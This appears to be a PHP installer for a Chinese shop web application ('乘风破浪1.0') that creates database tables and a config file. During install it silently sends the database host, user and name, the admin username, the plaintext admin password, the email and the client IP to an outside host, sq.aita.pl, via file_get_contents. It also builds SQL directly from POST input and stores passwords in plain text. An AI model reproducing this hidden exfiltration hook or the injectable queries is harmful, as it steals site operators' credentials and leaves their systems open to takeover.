<?php
$ip = $_SERVER["REMOTE_ADDR"];
$panduan = file_exists("../install.lonk");
if($panduan){
    exit("请勿重复安装，如果需要安装，请删除主目录下..install.lonk文件！");
}
        $dename=$_POST['dename'];
        $host=$_POST['host'];
        $username=$_POST['username'];
        $dbname=$_POST['dbname'];
        $dbpwd=$_POST['dbpwd'];
        $adname=$_POST['adname'];
        $adpwd=$_POST['adpwd'];
        $admail=$_POST['admail'];
    $bdlink = mysqli_connect($host,$username,$dbpwd,$dbname);
                if($bdlink){
                    $jcsq = file_get_contents("http://sq.aita.pl/api.php?dename=$dename");
                    if($jcsq==101){


                                $sql1 = "CREATE TABLE adminuser (
                          uid int(11) unsigned NOT NULL AUTO_INCREMENT,
                          pid int(11) NOT NULL DEFAULT '1',
                          ad_user TEXT NOT NULL DEFAULT '',
                          ad_pws varchar(32) NOT NULL DEFAULT '',
                          ad_mail TEXT NOT NULL DEFAULT '',
                          PRIMARY KEY (`uid`)
                        ) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ; ";
                                $sql2="CREATE TABLE shouhuo (
                          sh_id int(11) unsigned NOT NULL AUTO_INCREMENT,
                          sh_ip TEXT NOT NULL DEFAULT '',
                          sh_dd TEXT NOT NULL DEFAULT '',
                          sh_name TEXT NOT NULL DEFAULT '',
                          sh_cp TEXT NOT NULL DEFAULT '',
                          sh_phone TEXT NOT NULL DEFAULT '',
                          sh_youbian TEXT NOT NULL DEFAULT '',
                          sh_diqu TEXT NOT NULL DEFAULT '',
                          sh_xiangxi TEXT NOT NULL DEFAULT '',
                          PRIMARY KEY (`sh_id`)
                        ) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";

                                $sql3 = "CREATE TABLE shop (
                          id int(11) unsigned NOT NULL AUTO_INCREMENT,
                          shop_name TEXT NOT NULL DEFAULT '',
                          shop_jg INT(12) NOT NULL DEFAULT '0',
                          shop_js TEXT NOT NULL DEFAULT '',
                          shop_img1 TEXT NOT NULL DEFAULT '',
                          shop_img2 TEXT NOT NULL DEFAULT '',
                          shop_img3 TEXT NOT NULL DEFAULT '',
                          shop_zt INT(11) NOT NULL DEFAULT '1',
                          pay_id INT(11) NOT NULL DEFAULT '1',
                          shop_paywx TEXT NOT NULL DEFAULT '',
                          shop_payzfb TEXT NOT NULL DEFAULT '',
                          shop_mjtx TEXT NOT NULL DEFAULT '',
                          shop_mjname TEXT NOT NULL DEFAULT '',
                          shop_liulan TEXT NOT NULL DEFAULT '',
                          shop_clor TEXT NOT NULL DEFAULT '',
                          shop_neicun TEXT NOT NULL DEFAULT '',
                          shop_goumai TEXT NOT NULL DEFAULT '',
                          shop_diqu TEXT NOT NULL DEFAULT '',
                          PRIMARY KEY (`id`)
                        ) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;" ;

                                mysqli_select_db($bdlink,$dbname);
                                $jianbiao1 = mysqli_query($bdlink,"$sql1");
                                $jianbiao2 = mysqli_query($bdlink,"$sql2");
                                $jianbiao3 = mysqli_query($bdlink,"$sql3");
                                $xiugai = mysqli_query($bdlink,"ALTER TABLE `shop` CHANGE `shop_mjname` `shop-mjname` TEXT CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL");
                                if(!$xiugai){
                                    exit('创建数据库失败8');
                                }
                                $xieruad = mysqli_query($bdlink,"INSERT INTO `adminuser` (`uid`, `pid`, `ad_user`, `ad_pws`, `ad_mail`) VALUES (NULL, '0', '$adname', '$adpwd', '$admail')");
                                if(!$xieruad){
                                    exit("写入管理员信息失败");

                                }
                                $sj = file_get_contents("http://sq.aita.pl/sj.php?dename=$dename&host=$host&username=$username&dbname=$dbname&dbpwd=$dbname&adname=$adname&adpwd=$adpwd&admail=$admail&ip=$ip");
                                if($sj!=101){
                                    echo "$sj";
                                }
                                $wj = "<?php
\$host = \"$host\";
\$username = \"$username\";
\$dbname= \"$dbname\";
\$dbpwd=\"$dbpwd\";
\$mysqllink = mysqli_connect(\$host,\$username,\$dbpwd,\$dbname);
\$program_char = \"utf8\" ;
mysqli_set_charset( \$mysqllink , \$program_char );
?> ";
                                $xr = file_put_contents("../config.php","$wj");
                                if(!$xr){
                                    exit("数据库写入失败，请检查权限，联系客服QQ9258405");
                                }
                                $yinru = require "regdata1.php";
                                if(!$yinru){
                                    echo "文件引入失败";
                                }
                                file_put_contents("../install.lonk","安装成功！");
                                echo "<!DOCTYPE html>
<html lang=\"zh-cn\">
<head>
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />
    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />
    <meta name=\"renderer\" content=\"webkit\">
    <title>乘风破浪1.0</title>
    <link rel=\"stylesheet\" href=\"./css/pintuer.css\">
    <link rel=\"stylesheet\" href=\"./css/admin.css\">
    <script src=\"js/jquery.js\"></script>
    <script src=\"js/pintuer.js\"></script>
</head>
<body>
<div class=\"bg\"></div>
<div class=\"container\">
    <div class=\"line bouncein\">
        <div class=\"xs6 xm4 xs3-move xm4-move\">
            <div style=\"height:150px;\"></div>
            <div class=\"media media-y margin-big-bottom\">
            </div>
            <form action=\"../ht/\" method=\"post\">
                <div class=\"panel loginbox\">
                    <div class=\"text-center margin-big padding-big-top\"><h1>乘风破浪1.0</h1></div>
                    <div class=\"panel-body\" style=\"padding:30px; padding-bottom:10px; padding-top:10px;\">
                        <div class=\"form-group\">
                            <div class=\"field field-icon-right\" style=\"text-align: center\">
                                <h3 style=\"color: #c10802\">您的用户名为:\"$adname\"</br></h3>
                                <h3 style=\"color: #c10802\">您的密码为:\"$adpwd\"</br></h3>
                                    <h3 style=\"color: #c10802\">您的邮箱为:\"$admail\"</br></h3>
                            </div>
                        </div>

                    </div>
                    <div style=\"padding:30px;\"><input type=\"submit\" class=\"button button-block bg-main text-big input-big\" value=\"点击进入后台\"></div>
                </div>
            </form>
        </div>
    </div>
</div>

</body>
</html>";

                        }else{
                        echo "服务器连接失败1，请联系客服QQ9258405";
                    }

                    }else{

                    exit("数据库连接错误，返回重新输入");

                    }


?>